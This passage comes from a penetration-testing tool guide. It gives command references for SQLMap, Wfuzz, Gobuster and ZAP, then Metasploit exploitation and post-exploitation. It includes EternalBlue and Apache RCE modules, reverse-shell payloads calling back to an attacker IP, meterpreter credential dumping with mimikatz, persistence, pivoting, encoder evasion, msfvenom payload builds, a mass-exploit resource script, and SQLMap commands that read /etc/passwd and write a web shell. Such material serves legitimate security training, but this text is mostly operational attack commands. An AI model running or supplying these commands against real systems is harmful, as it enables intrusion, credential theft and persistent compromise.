while int(zap.spider.status(scanid)) < 100:
    print(f'Spider progress: {zap.spider.status(scanid)}%')
    time.sleep(2)

# Active Scan
print('Active scanning...')
scanid = zap.ascan.scan(target)
while int(zap.ascan.status(scanid)) < 100:
    print(f'Scan progress: {zap.ascan.status(scanid)}%')
    time.sleep(5)

# Get alerts
print('Vulnerabilities found:')
alerts = zap.core.alerts(baseurl=target)
for alert in alerts:
    print(f"{alert['risk']} - {alert['alert']}: {alert['url']}")
```

**SQLMap**

```bash
# Basic SQL injection testing
sqlmap -u "http://target.com/page.php?id=1"

# Test all parameters
sqlmap -u "http://target.com/page.php?id=1&name=test" --batch

# POST request with data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# With cookie authentication
sqlmap -u "http://target.com/admin.php?id=1" --cookie="PHPSESSID=abc123def456"

# Specify injection parameter
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Columns in table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# Dump table data
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# Dump all databases
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Skip confirmation prompts
sqlmap -u "http://target.com/page.php?id=1" --batch

# Aggressive testing (more payloads)
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3

# Specify DBMS
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# Technique specification
# B: Boolean-based blind
# E: Error-based
# U: UNION query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST

# OS shell (if privileges allow)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# Read file from system
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Write file to system
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**SQLMap with Request File**

```bash
# Capture request in Burp, save to file
# Right-click request → Copy to file → request.txt

# Use saved request
sqlmap -r request.txt

# With specific parameter
sqlmap -r request.txt -p username

# Tamper scripts (WAF bypass)
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between

# Common tamper scripts:
# - space2comment: Replace space with /**/
# - between: Replace > with NOT BETWEEN 0 AND #
# - charencode: URL encode characters
# - randomcase: Random case
# - base64encode: Base64 encode
```

**SQLMap Advanced Options**

```bash
# Proxy usage
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Random User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Custom User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0..."

# Delay between requests
sqlmap -u "http://target.com/page.php?id=1" --delay=2

# Threads (faster)
sqlmap -u "http://target.com/page.php?id=1" --threads=10

# Verbose output
sqlmap -u "http://target.com/page.php?id=1" -v 3

# Save session
sqlmap -u "http://target.com/page.php?id=1" -s session.sqlite

# Parse errors
sqlmap -u "http://target.com/page.php?id=1" --parse-errors

# Test for WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Crawl website first
sqlmap -u "http://target.com" --crawl=2

# Forms auto-detection
sqlmap -u "http://target.com/login.php" --forms

# Second-order SQL injection
sqlmap -u "http://target.com/page.php?id=1" --second-url="http://target.com/results.php"
```

**Wfuzz**

```bash
# Basic directory fuzzing
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://target.com/FUZZ

# Hide 404 responses
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ

# Hide specific response codes
wfuzz -c -z file,wordlist.txt --hc 404,403,500 http://target.com/FUZZ

# Show only specific codes
wfuzz -c -z file,wordlist.txt --sc 200,301,302 http://target.com/FUZZ

# Hide responses by word count
wfuzz -c -z file,wordlist.txt --hw 42 http://target.com/FUZZ

# Hide by character count
wfuzz -c -z file,wordlist.txt --hh 5500 http://target.com/FUZZ

# Hide by line count
wfuzz -c -z file,wordlist.txt --hl 30 http://target.com/FUZZ

# Multiple extension fuzzing
wfuzz -c -z file,wordlist.txt -z list,php-txt-html http://target.com/FUZZ.FUZ2Z

# Subdomain enumeration
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 404 -H "Host: FUZZ.target.com" http://target.com

# Virtual host discovery
wfuzz -c -z file,wordlist.txt -H "Host: FUZZ.target.com" --hh 5500 http://10.10.10.100

# Parameter fuzzing (GET)
wfuzz -c -z file,wordlist.txt http://target.com/page.php?FUZZ=test

# Parameter value fuzzing
wfuzz -c -z file,wordlist.txt http://target.com/page.php?id=FUZZ

# POST parameter fuzzing
wfuzz -c -z file,wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login.php

# Multiple payload positions
wfuzz -c -z file,users.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" http://target.com/login.php

# Cookie fuzzing
wfuzz -c -z file,wordlist.txt -b "session=FUZZ" http://target.com/admin

# Header fuzzing
wfuzz -c -z file,wordlist.txt -H "X-Forwarded-For: FUZZ" http://target.com

# User-Agent fuzzing
wfuzz -c -z file,user-agents.txt -H "User-Agent: FUZZ" http://target.com

# Recursion
wfuzz -c -z file,wordlist.txt -R 2 http://target.com/FUZZ

# With proxy
wfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080 http://target.com/FUZZ

# Custom payloads
wfuzz -c -z range,1-1000 http://target.com/page.php?id=FUZZ

# List payload
wfuzz -c -z list,admin-root-test http://target.com/FUZZ

# File payload
wfuzz -c -z file,/etc/passwd http://target.com/FUZZ

# Output to file
wfuzz -c -z file,wordlist.txt -f output.txt http://target.com/FUZZ

# JSON output
wfuzz -c -z file,wordlist.txt -o json http://target.com/FUZZ

# Threading
wfuzz -c -z file,wordlist.txt -t 50 http://target.com/FUZZ
```

**Wfuzz Advanced Techniques**

```bash
# Baseline response filtering
# First, identify baseline response
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ

# Then filter it (example: hide 5234 chars)
wfuzz -c -z file,wordlist.txt --hh 5234 http://target.com/FUZZ

# SQL injection fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt http://target.com/page.php?id=FUZZ

# XSS payload fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt http://target.com/search?q=FUZZ

# Command injection fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt http://target.com/exec?cmd=FUZZ

# LFI fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://target.com/page.php?file=FUZZ

# Authentication bypass
wfuzz -c -z file,/usr/share/seclists/Fuzzing/auth-bypass.txt -d "username=admin&password=FUZZ" http://target.com/login.php

# IDOR testing
wfuzz -c -z range,1-1000 --hc 404,403 http://target.com/api/user/FUZZ

# API endpoint discovery
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt http://target.com/api/FUZZ

# HTTP method fuzzing
wfuzz -c -z list,GET-POST-PUT-DELETE-PATCH-OPTIONS -X FUZZ http://target.com/api/users
```

**Gobuster**

```bash
# Directory/file brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak

# Multiple extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,xml,bak,zip

# Show full URLs
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -e

# Expanded mode (show full URL)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -e -k

# Ignore SSL certificate errors
gobuster dir -u https://target.com -w wordlist.txt -k

# Custom status codes
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,307,401,403"

# Negative status codes (exclude)
gobuster dir -u http://target.com -w wordlist.txt -b "404,400"

# Threads (faster)
gobuster dir -u http://target.com -w wordlist.txt -t 50

# Timeout
gobuster dir -u http://target.com -w wordlist.txt --timeout 10s

# User-Agent
gobuster dir -u http://target.com -w wordlist.txt -a "Mozilla/5.0"

# Proxy
gobuster dir -u http://target.com -w wordlist.txt --proxy http://127.0.0.1:8080

# Cookies
gobuster dir -u http://target.com -w wordlist.txt -c "session=abc123"

# Headers
gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token"

# Username/Password (Basic Auth)
gobuster dir -u http://target.com -w wordlist.txt -U admin -P password

# Output to file
gobuster dir -u http://target.com -w wordlist.txt -o results.txt

# Quiet mode
gobuster dir -u http://target.com -w wordlist.txt -q

# Verbose mode
gobuster dir -u http://target.com -w wordlist.txt -v

# No progress
gobuster dir -u http://target.com -w wordlist.txt --no-progress

# Follow redirects
gobuster dir -u http://target.com -w wordlist.txt -r

# Wildcard detection/skipping
gobuster dir -u http://target.com -w wordlist.txt --wildcard
```

**Gobuster DNS Mode**

```bash
# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# With custom resolvers
gobuster dns -d target.com -w wordlist.txt -r 8.8.8.8,1.1.1.1

# Show CNAMEs
gobuster dns -d target.com -w wordlist.txt --show-cname

# Show IPs
gobuster dns -d target.com -w wordlist.txt --show-ips

# Wildcard domain handling
gobuster dns -d target.com -w wordlist.txt --wildcard
```

**Gobuster VHost Mode**

```bash
# Virtual host discovery
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Append domain
gobuster vhost -u http://target.com -w wordlist.txt --append-domain

# Specific domain
gobuster vhost -u http://10.10.10.100 -w wordlist.txt --domain target.local
```

**Gobuster S3 Mode** ([Unverified] - AWS S3 bucket enumeration)

```bash
# S3 bucket enumeration
gobuster s3 -w wordlist.txt

# Specific region
gobuster s3 -w wordlist.txt -r us-west-2
```

**Comprehensive Web Testing Workflow**

```bash
#!/bin/bash
# web_recon.sh - Comprehensive web application testing

TARGET=$1
OUTPUT_DIR="web_test_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

mkdir -p $OUTPUT_DIR/{gobuster,wfuzz,sqlmap,nikto,screenshots}
cd $OUTPUT_DIR

echo "[*] Starting web application testing on $TARGET"

# ========================================
# PHASE 1: Information Gathering
# ========================================
echo -e "\n[*] PHASE 1: Information Gathering"

# Technology detection
echo "[*] Detecting technologies..."
whatweb -a 3 $TARGET > whatweb.txt

# WAF detection
echo "[*] Checking for WAF..."
wafw00f $TARGET > waf_detection.txt

# SSL/TLS testing (if HTTPS)
if [[ $TARGET == https* ]]; then
    echo "[*] Testing SSL/TLS..."
    sslscan $TARGET > sslscan.txt
fi

# Robots.txt and sitemap
echo "[*] Checking robots.txt and sitemap..."
curl -s $TARGET/robots.txt > robots.txt
curl -s $TARGET/sitemap.xml > sitemap.xml

# ========================================
# PHASE 2: Directory Enumeration
# ========================================
echo -e "\n[*] PHASE 2: Directory Enumeration"

# Gobuster - common directories
echo "[*] Running gobuster (common)..."
gobuster dir -u $TARGET \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php,html,txt,bak \
    -o gobuster/common.txt \
    -t 50 -q

# Gobuster - comprehensive
echo "[*] Running gobuster (comprehensive)..."
gobuster dir -u $TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,html,txt,js,xml,json,bak,zip \
    -o gobuster/comprehensive.txt \
    -t 50 -q &

# ========================================
# PHASE 3: Vulnerability Scanning
# ========================================
echo -e "\n[*] PHASE 3: Vulnerability Scanning"

# Nikto scan
echo "[*] Running Nikto..."
nikto -h $TARGET -output nikto/nikto_scan.txt &

# ========================================
# PHASE 4: Manual Testing with Burp/ZAP
# ========================================
echo -e "\n[*] PHASE 4: Manual Testing Preparation"

# Start ZAP in daemon mode
echo "[*] Starting ZAP proxy..."
zap.sh -daemon -port 8090 -config api.disablekey=true &
ZAP_PID=$!
sleep 10

# Spider with ZAP
echo "[*] Spidering with ZAP..."
python3 << 'EOFPYTHON'
from zapv2 import ZAPv2
import time
import sys

target = sys.argv[1]
zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8090', 'https': 'http://127.0.0.1:8090'})

print(f'Spidering {target}...')
scanid = zap.spider.scan(target)
while int(zap.spider.status(scanid)) < 100:
    print(f'Spider progress: {zap.spider.status(scanid)}%')
    time.sleep(2)

print('Spider complete')
EOFPYTHON $TARGET

# ========================================
# PHASE 5: Automated SQL Injection Testing
# ========================================
echo -e "\n[*] PHASE 5: SQL Injection Testing"

# Extract URLs with parameters from gobuster results
echo "[*] Testing for SQL injection..."
grep "?" gobuster/*.txt 2>/dev/null | while read url; do
    echo "[*] Testing: $url"
    sqlmap -u "$url" --batch --level=1 --risk=1 --output-dir=sqlmap/ --threads=5 &
done

# ========================================
# PHASE 6: Parameter Fuzzing
# ========================================
echo -e "\n[*] PHASE 6: Parameter Fuzzing"

# Common parameter names
echo "[*] Fuzzing common parameters..."
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    --hc 404 \
    "$TARGET/index.php?FUZZ=test" \
    -o wfuzz/params.json \
    -t 50 2>/dev/null &

# ========================================
# Wait for background tasks
# ========================================
echo -e "\n[*] Waiting for scans to complete..."
wait

# Stop ZAP
kill $ZAP_PID 2>/dev/null

# ========================================
# PHASE 7: Results Summary
# ========================================
echo -e "\n[*] PHASE 7: Generating Summary"

cat > SUMMARY.txt << EOF
========================================
WEB APPLICATION TEST SUMMARY
========================================
Target: $TARGET
Test Date: $(date)
Output Directory: $(pwd)

DISCOVERED DIRECTORIES/FILES:
$(cat gobuster/common.txt 2>/dev/null | grep "Status: 200" | wc -l) endpoints found

TOP FINDINGS:
$(cat gobuster/common.txt 2>/dev/null | grep "Status: 200" | head -10)

TECHNOLOGIES DETECTED:
$(grep -E "^\[" whatweb.txt 2>/dev/null | head -5)

NIKTO FINDINGS:
$(grep "+ " nikto/nikto_scan.txt 2>/dev/null | head -10)

SQL INJECTION:
$(find sqlmap -name "*.csv" 2>/dev/null | wc -l) potential injection points

RECOMMENDATIONS:
1. Review all discovered endpoints manually
2. Test authentication mechanisms
3. Check for IDOR vulnerabilities
4. Test file upload functionality
5. Verify input validation
6. Check for business logic flaws

Full results available in subdirectories.
EOF

cat SUMMARY.txt

echo -e "\n[+] Web testing complete!"
echo "[+] Results saved to: $(pwd)"
```

**Web Testing Tool Comparison**

```markdown
| Tool | Best For | Speed | Accuracy | Learning Curve |
|------|----------|-------|----------|----------------|
| Burp Suite | Manual testing, complex attacks | Medium | High | Medium-High |
| OWASP ZAP | Automation, CI/CD integration | Fast | Medium-High | Low-Medium |
| SQLMap | SQL injection exploitation | Fast | Very High | Low |
| Wfuzz | Fuzzing, custom payloads | Very Fast | Medium | Medium |
| Gobuster | Directory enumeration | Very Fast | High | Low |
```

**Quick Reference: Tool Selection**

```bash
# Use Burp Suite when:
- Manual testing required
- Complex multi-step attacks
- Session handling needed
- Detailed request manipulation
- Extension ecosystem needed

# Use OWASP ZAP when:
- Automated scanning preferred
- CI/CD integration
- Open-source required
- API testing
- Quick vulnerability assessment

# Use SQLMap when:
- SQL injection suspected
- Database enumeration needed
- Automated exploitation required
- Time-based blind SQLi
- Advanced DBMS features needed

# Use Wfuzz when:
- Parameter fuzzing
- Custom payload lists
- Multiple injection points
- Baseline response filtering
- Header/cookie fuzzing

# Use Gobuster when:
- Directory enumeration
- Fast scanning needed
- Multiple file extensions
- Subdomain/vhost discovery
- Simple, focused brute forcing
```

---

**Important Testing Considerations:**

- Always obtain proper authorization before testing
- Be mindful of request rates - don't DoS the target
- Use threading carefully - start low and increase
- Monitor target's response - back off if errors occur
- Save all traffic for later analysis
- Document every finding thoroughly
- Verify automated findings manually
- Check for false positives before reporting
- Respect scope boundaries strictly
- Use proxies/VPNs when appropriate for operational security

---

### Exploitation

Exploitation tools translate discovered vulnerabilities into actionable compromise. Mastery requires understanding tool capabilities, appropriate use cases, and integration into exploitation workflows.

---

#### Metasploit Framework

Metasploit provides a comprehensive exploitation platform with modular payloads, encoders, post-exploitation modules, and auxiliary scanners. It standardizes exploit development and delivery.

**Core Metasploit Architecture:**

```bash
# Metasploit directory structure
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Exploitation modules organized by platform
│   ├── payloads/      # Shellcode and staged payloads
│   ├── auxiliary/     # Scanning and auxiliary functions
│   ├── post/          # Post-exploitation modules
│   └── encoders/      # Payload encoding for evasion
├── data/              # Wordlists, templates, exploits
└── tools/             # Standalone utilities

# Database initialization (required for workspace management)
sudo msfdb init
sudo msfdb start
msfconsole
```

**Basic Metasploit Usage:**

```bash
# Start Metasploit console
msfconsole -q  # Quiet mode (skip banner)

# Search for exploits
msf6> search vsftpd
msf6> search type:exploit platform:linux cve:2021
msf6> search apache 2.4.49

# Filter search results
msf6> search type:exploit platform:windows rank:excellent
msf6> search name:eternalblue
msf6> search port:445

# Load an exploit
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> use 0  # Use by search result number

# View exploit information
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> info
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show payloads
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show targets
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show advanced
```

**Configuration and Exploitation:**

```bash
# Set required options
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set RHOSTS 192.168.1.10
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set RPORT 21
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set LHOST 10.10.14.5

# Set payload (if multiple available)
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set PAYLOAD cmd/unix/interact

# Verify configuration
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show options

# Execute exploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> exploit
# OR
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> run

# Run exploit without handler (for manual listener)
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> exploit -j  # Background job
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> exploit -z  # Don't interact with session
```

**Common Exploits and Usage Patterns:**

```bash
# EternalBlue (MS17-010) - Windows SMB
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue)> set RHOSTS 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue)> set LHOST 10.10.14.5
msf6 exploit(windows/smb/ms17_010_eternalblue)> set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue)> check  # Verify vulnerability
msf6 exploit(windows/smb/ms17_010_eternalblue)> exploit

# Apache 2.4.49 Path Traversal RCE (CVE-2021-41773)
msf6> use exploit/multi/http/apache_normalize_path_rce
msf6 exploit(multi/http/apache_normalize_path_rce)> set RHOSTS 192.168.1.10
msf6 exploit(multi/http/apache_normalize_path_rce)> set RPORT 80
msf6 exploit(multi/http/apache_normalize_path_rce)> set TARGETURI /cgi-bin
msf6 exploit(multi/http/apache_normalize_path_rce)> set LHOST 10.10.14.5
msf6 exploit(multi/http/apache_normalize_path_rce)> exploit

# Tomcat Manager Upload (requires credentials)
msf6> use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload)> set RHOSTS 192.168.1.10
msf6 exploit(multi/http/tomcat_mgr_upload)> set RPORT 8080
msf6 exploit(multi/http/tomcat_mgr_upload)> set HttpUsername tomcat
msf6 exploit(multi/http/tomcat_mgr_upload)> set HttpPassword s3cret
msf6 exploit(multi/http/tomcat_mgr_upload)> set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload)> set LHOST 10.10.14.5
msf6 exploit(multi/http/tomcat_mgr_upload)> exploit

# Jenkins Script Console RCE
msf6> use exploit/multi/http/jenkins_script_console
msf6 exploit(multi/http/jenkins_script_console)> set RHOSTS 192.168.1.10
msf6 exploit(multi/http/jenkins_script_console)> set RPORT 8080
msf6 exploit(multi/http/jenkins_script_console)> set TARGETURI /
msf6 exploit(multi/http/jenkins_script_console)> exploit
```

**Payload Selection and Configuration:**

```bash
# List available payloads for current exploit
msf6 exploit(...)> show payloads

# Common payload types:
# - Singles: Self-contained, no network connection required
# - Stagers: Small initial payload, downloads larger payload
# - Stages: Full-featured payload delivered by stager

# Reverse TCP (most common)
msf6> set PAYLOAD windows/meterpreter/reverse_tcp
msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp

# Bind TCP (when reverse connection blocked)
msf6> set PAYLOAD windows/meterpreter/bind_tcp
msf6> set RHOST 192.168.1.10
msf6> set LPORT 4444

# Reverse HTTPS (encrypted, evasive)
msf6> set PAYLOAD windows/meterpreter/reverse_https
msf6> set LHOST 10.10.14.5
msf6> set LPORT 443

# Shell payloads (lightweight, no meterpreter)
msf6> set PAYLOAD cmd/unix/reverse_bash
msf6> set PAYLOAD windows/shell/reverse_tcp

# Web-specific payloads
msf6> set PAYLOAD php/meterpreter/reverse_tcp
msf6> set PAYLOAD java/jsp_shell_reverse_tcp
```

**Meterpreter Post-Exploitation:**

```bash
# Once meterpreter session established
meterpreter> sysinfo              # System information
meterpreter> getuid               # Current user
meterpreter> ps                   # Process list
meterpreter> pwd                  # Current directory
meterpreter> ls                   # List files

# File operations
meterpreter> download /etc/passwd ./passwd_copy
meterpreter> upload exploit.sh /tmp/exploit.sh
meterpreter> cat /etc/shadow
meterpreter> search -f *.conf     # Search for files

# Process manipulation
meterpreter> migrate 1234         # Migrate to process ID 1234
meterpreter> getpid               # Current process ID
meterpreter> kill 5678            # Kill process

# Privilege escalation
meterpreter> getsystem            # Automated privilege escalation (Windows)
meterpreter> background           # Background current session

# Credential harvesting
meterpreter> hashdump             # Dump password hashes (Windows)
meterpreter> load kiwi            # Load mimikatz
meterpreter> kiwi_cmd sekurlsa::logonpasswords

# Persistence
meterpreter> run persistence -X -i 60 -p 4444 -r 10.10.14.5

# Pivoting
meterpreter> run autoroute -s 10.10.10.0/24  # Add route to internal network
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.5  # Port forward

# Execute system commands
meterpreter> shell                # Drop to system shell
meterpreter> execute -f cmd.exe -i -H  # Execute command
```

**Session Management:**

```bash
# List active sessions
msf6> sessions -l

# Interact with specific session
msf6> sessions -i 1

# Background session (from within session)
meterpreter> background
# OR press Ctrl+Z

# Kill session
msf6> sessions -k 1

# Run command on session without interaction
msf6> sessions -C "sysinfo" -i 1

# Run module on all sessions
msf6> sessions -c "run post/windows/gather/enum_logged_on_users" -i 1-5
```

**Workspace and Database Management:**

```bash
# Create workspace for organized testing
msf6> workspace -a ctf_target1
msf6> workspace                   # List workspaces
msf6> workspace ctf_target1       # Switch workspace

# Import scan results
msf6> db_import /path/to/nmap_scan.xml

# Query database
msf6> hosts                       # List discovered hosts
msf6> services                    # List discovered services
msf6> vulns                       # List identified vulnerabilities
msf6> loot                        # List captured data

# Run nmap through Metasploit (auto-import results)
msf6> db_nmap -sV -sC 192.168.1.0/24

# Search hosts with specific service
msf6> services -p 445             # Find hosts with port 445 open
msf6> hosts -c address,os_name    # Custom column display
```

**Auxiliary Modules:**

```bash
# Port scanning
msf6> use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp)> set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp)> set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp)> run

# Service version detection
msf6> use auxiliary/scanner/http/http_version
msf6> set RHOSTS 192.168.1.0/24
msf6> run

# SMB enumeration
msf6> use auxiliary/scanner/smb/smb_version
msf6> set RHOSTS 192.168.1.10
msf6> run

msf6> use auxiliary/scanner/smb/smb_enumshares
msf6> set RHOSTS 192.168.1.10
msf6> run

# SSH login attempts
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> set RHOSTS 192.168.1.10
msf6> set USERNAME root
msf6> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6> set THREADS 10
msf6> run

# HTTP directory brute force
msf6> use auxiliary/scanner/http/dir_scanner
msf6> set RHOSTS 192.168.1.10
msf6> run

# Database login
msf6> use auxiliary/scanner/mysql/mysql_login
msf6> set RHOSTS 192.168.1.10
msf6> set USERNAME root
msf6> set BLANK_PASSWORDS true
msf6> run
```

**Post-Exploitation Modules:**

```bash
# Windows privilege escalation check
msf6> use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester)> set SESSION 1
msf6 post(multi/recon/local_exploit_suggester)> run

# Gather system information
msf6> use post/windows/gather/enum_applications
msf6> set SESSION 1
msf6> run

# Credential harvesting
msf6> use post/windows/gather/credentials/credential_collector
msf6> set SESSION 1
msf6> run

# Linux enumeration
msf6> use post/linux/gather/enum_system
msf6> set SESSION 1
msf6> run

# Check for passwords in files
msf6> use post/windows/gather/enum_unattend
msf6> set SESSION 1
msf6> run
```

**Command-Line Metasploit (msfcli alternative - now msfconsole -x):**

```bash
# Execute Metasploit commands from shell
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.10; set LHOST 10.10.14.5; exploit"

# Resource scripts (automated sequences)
cat > auto_exploit.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit -j
EOF

msfconsole -r auto_exploit.rc

# Multiple target automation
cat > multi_target.rc << 'EOF'
workspace -a mass_exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set LHOST 10.10.14.5
set ExitOnSession false

set RHOSTS 192.168.1.10
exploit -j

set RHOSTS 192.168.1.11
exploit -j

set RHOSTS 192.168.1.12
exploit -j
EOF
```

**Advanced Metasploit Techniques:**

```bash
# Payload encoding (evasion)
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set PAYLOAD windows/meterpreter/reverse_tcp
msf6> set LHOST 10.10.14.5
msf6> show encoders
msf6> set ENCODER x86/shikata_ga_nai
msf6> set ITERATIONS 5
msf6> exploit

# Custom payload generation with msfvenom (covered later)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe

# Multi-handler for custom payloads
msf6> use exploit/multi/handler
msf6 exploit(multi/handler)> set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler)> set LHOST 10.10.14.5
msf6 exploit(multi/handler)> set LPORT 4444
msf6 exploit(multi/handler)> exploit -j  # Background listener

# Pivoting through compromised host
meterpreter> run autoroute -s 10.10.10.0/24
msf6> use auxiliary/scanner/portscan/tcp
msf6> set RHOSTS 10.10.10.0/24
msf6> run  # Scan through pivot

# SOCKS proxy for pivoting
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 1080
msf6> set VERSION 4a
msf6> run -j

# Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT 10.10.10.5
```

---

#### Searchsploit (Exploit-DB Integration)

Searchsploit provides command-line access to the Exploit Database, enabling rapid identification of public exploits for discovered vulnerabilities.

**Basic Searchsploit Usage:**

```bash
# Search for exploits
searchsploit apache 2.4.49
searchsploit vsftpd
searchsploit wordpress 5.8

# Case-insensitive search
searchsploit -t Apache  # Title search only

# Search with version number
searchsploit "Linux Kernel 3.13"
searchsploit "Windows 7"

# Exclude specific terms
searchsploit apache --exclude="Denial of Service"
searchsploit windows --exclude="dos"

# Search by CVE
searchsploit CVE-2021-41773
searchsploit CVE-2017-0144

# Platform-specific search
searchsploit --platform=linux privilege escalation
searchsploit --platform=windows smb
searchsploit --platform=php upload
```

**Exploit Information and Retrieval:**

```bash
# View exploit details
searchsploit -x exploits/linux/local/12345.c  # Examine exploit code
searchsploit -x 12345  # Shorter syntax using EDB-ID

# Copy exploit to current directory
searchsploit -m exploits/linux/local/12345.c
searchsploit -m 12345  # Copy by EDB-ID

# Copy to specific directory
searchsploit -m 12345 -p /tmp/exploits/

# Get exploit path
searchsploit -p 12345

# Open exploit in browser (Exploit-DB page)
searchsploit -w apache 2.4.49
```

**Advanced Searchsploit Features:**

```bash
# JSON output for parsing
searchsploit apache --json | jq .

# Example: Extract exploit paths programmatically
searchsploit apache 2.4.49 --json | jq -r '.RESULTS_EXPLOIT[].Path'

# XML output
searchsploit apache --xml

# Color output control
searchsploit --colour apache  # Force color
searchsploit --no-colour apache  # Disable color

# Strict search (exact match)
searchsploit -s "Apache 2.4.49"

# Search in title, description, and path
searchsploit --id proftpd  # Search all fields
```

**Exploit Database Updates:**

```bash
# Update exploit database
searchsploit -u

# Check current version
searchsploit --version

# Database location
ls -la /usr/share/exploitdb/
cat /usr/share/exploitdb/files_exploits.csv | head
```

**Practical Searchsploit Workflow:**

```bash
#!/bin/bash
# Automated exploit search from nmap results

nmap_file=$1

# Extract services and versions
grep -E "open.*tcp" $nmap_file | while read line; do
    port=$(echo $line | awk '{print $1}' | cut -d'/' -f1)
    service=$(echo $line | awk '{print $3}')
